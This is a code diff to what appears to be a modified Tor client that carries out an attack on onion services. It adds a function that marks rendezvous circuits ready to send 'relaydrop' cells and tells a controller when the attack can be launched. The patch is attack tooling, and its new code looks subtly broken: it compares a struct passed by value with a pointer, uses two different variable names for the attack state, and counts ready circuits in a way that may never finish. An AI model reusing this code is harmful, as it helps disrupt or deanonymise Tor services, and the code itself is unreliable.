@@ -48,7 +48,7 @@ hs_attack_stats hs_attack_entry_point(hs_attack_cmd_t cmd, char *onionaddress,
 }
 
 int init_rendezvous_circuits(uint16_t nbr_circuits, char *onionaddress) {
-  //XXX might loop infinitly => should return -1 if too much circ launch
+  //XXX might loop infinitly => should return -1 if too many circs launched
   // failed  (define 'too much' ? )
   int c = 0;
   while (attack_info->rendcircs->num_used < nbr_circuits) {
@@ -126,7 +126,7 @@ void hs_attack_send_intro_cell_callback(origin_circuit_t *rendcirc){
           rendcirc_info->state = REND_CIRC_INTRO_CELL_SENT;
           break;
         }
-      }
+      } SMARTLIST_FOREACH_END(rendcirc_info);
     }
     // todo
   }
@@ -134,6 +134,26 @@ void hs_attack_send_intro_cell_callback(origin_circuit_t *rendcirc){
   //tell controler what happens depending on retvals
   control_event_hs_attack();
 
+}
+
+/*
+ * Received a rendezous2 cell on circ; circ joined and is
+ * now ready to send relaydrop cells
+ * Send message to the controller if all circs are ready
+ */
+void hs_attack_mark_rendezvous_ready(origin_circuit_t rendcirc) {
+  int count_ready = 0;
+  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, rendcirc_info) {
+    if (rendcirc_info->circ == rendcirc) {
+      rendcirc_info->state = REND_CIRC_READY_FOR_RD;
+      break;
+    }
+    if (rendcirc_info->state == REND_CIRC_READY_FOR_RD)
+      count_ready++;
+  } SMARTLIST_FOREACH_END(rendcirc_info);
+  if (count_ready == attack_infos->rendcircs->num_used)
+    //tell controller that we are ready to launch the attack
+    control_event_hs_attack();
 }
 
 void hs_attack_mark_intro_ready() {
